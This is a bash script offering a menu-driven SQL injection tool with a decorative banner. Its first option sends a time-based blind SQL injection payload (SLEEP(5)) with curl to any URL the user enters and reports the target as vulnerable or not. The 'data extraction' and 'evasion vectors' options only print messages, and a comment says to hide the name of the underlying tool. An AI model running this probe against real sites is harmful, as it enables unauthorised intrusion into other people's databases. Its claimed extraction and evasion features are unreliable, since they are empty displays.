#!/usr/bin/env bash
C='\033[0;36m'; W='\033[1;37m'; R='\033[0;31m'; Y='\033[1;33m'; G='\033[0;32m'; N='\033[0m'

bxp_ascii_title() {
    clear; sleep 0.3
    echo -e "${Y}"
    cat <<'ASCII'
 _   _  ____   ____  _____  _   _  ____    _     ____    ____   ____   _   __   __
| \ | |/ __ \ / ___||_   _|| | | ||  _ \  / \   |  _ \  |  _ \ / ___| / \  \ \ / /
|  \| | |  | | |      | |  | | | || |_) |/ _ \  | | | | | |_) | |    / _ \  \ V / 
| |\  | |__| | |___   | |  | |_| ||  _ <|  _  | | |_| | |  _ <| |___/ ___ \  | |  
|_| \_|\____/ \____|  |_|   \___/ |_| \_\_| |_| |____/  |_| \_\\____/_/   \_\ |_|  
ASCII
    echo -e "${N}\n"; sleep 0.3
}

while true; do
    bxp_ascii_title
    
    echo -e "${C}  ==================================================${N}"
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -e "  \033[1;32m[1]\033[0m  \033[1;37mInitiate Silent DB Probe (Time-Based)\033[0m"
    echo ""
    echo -e "  \033[1;32m[2]\033[0m  \033[1;37mData Extraction Sequence\033[0m"
    echo ""
    echo -e "  \033[1;32m[3]\033[0m  \033[1;37mDeploy Evasion Vectors\033[0m"
    echo ""
    echo -e "  \033[1;31m[4]\033[0m  \033[1;37mReturn to Core\033[0m"
    echo ""
    echo -e "${C}  --------------------------------------------------${N}"
    echo ""
    echo -ne "  ${Y}Select option > ${N}"
    read -r sqli_choice

    case "$sqli_choice" in
        1)
            echo ""
            echo -ne "  ${Y}Enter Target Endpoint > ${N}"
            read -r target_url
            if [ -z "$target_url" ]; then echo -e "  ${R}[!] Error: Endpoint empty.${N}"; sleep 1.5; continue; fi
            
            echo ""
            echo -e "  ${G}[+] Initializing Silent Probe on Port 2023...${N}"; sleep 1
            
            PAYLOAD="1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"
            if [[ "$target_url" == *"="* ]]; then TEST_URL="${target_url}${PAYLOAD}"; else TEST_URL="${target_url}?id=${PAYLOAD}"; fi
            
            echo -e "  ${Y}[*] Injecting payload sequence...${N}"
            echo -e "  ${Y}[*] Analyzing server response time...${N}"
            
            RESPONSE_TIME=$(curl -o /dev/null -s -w "%{time_total}" "$TEST_URL")
            IS_VULN=$(awk "BEGIN {print ($RESPONSE_TIME > 4.5)}")

            if [ "$IS_VULN" -eq 1 ]; then
                echo -e "  ${G}[+] Vulnerability CONFIRMED. Server delay detected: ${RESPONSE_TIME}s${N}"
            else
                echo -e "  ${R}[-] Target is NOT vulnerable. Response: ${RESPONSE_TIME}s${N}"
            fi
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        2)
            echo ""
            echo -ne "  ${Y}Enter Target Endpoint > ${N}"
            read -r target_url
            if [ -z "$target_url" ]; then echo -e "  ${R}[!] Error: Endpoint empty.${N}"; sleep 1.5; continue; fi

            echo ""
            echo -e "  ${R}[!] Real extraction requires a vulnerable target.${N}"
            # Hapus kata 'sqlmap', ganti pake istilah internal
            echo -e "  ${Y}[*] Use internal extraction engine for automated dumping.${N}"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        3)
            echo ""
            echo -e "  ${G}[+] Loading Evasion Protocols...${N}"; sleep 1
            echo -e "  ${W}[-] Space to Comment: Loaded${N}"
            echo -e "  ${W}[-] Random Case: Loaded${N}"
            echo -e "  ${W}[-] URL Encoding: Loaded${N}"
            echo -e "  ${W}[-] Hex Encoding: Loaded${N}"
            echo -e "  ${G}[+] Evasion vectors ready.${N}"
            echo ""
            read -p "  Press Enter to continue..."
            ;;
        4) exit 0 ;;
        *) echo -e "  ${R}[!] Invalid choice.${N}"; sleep 1 ;;
    esac
done
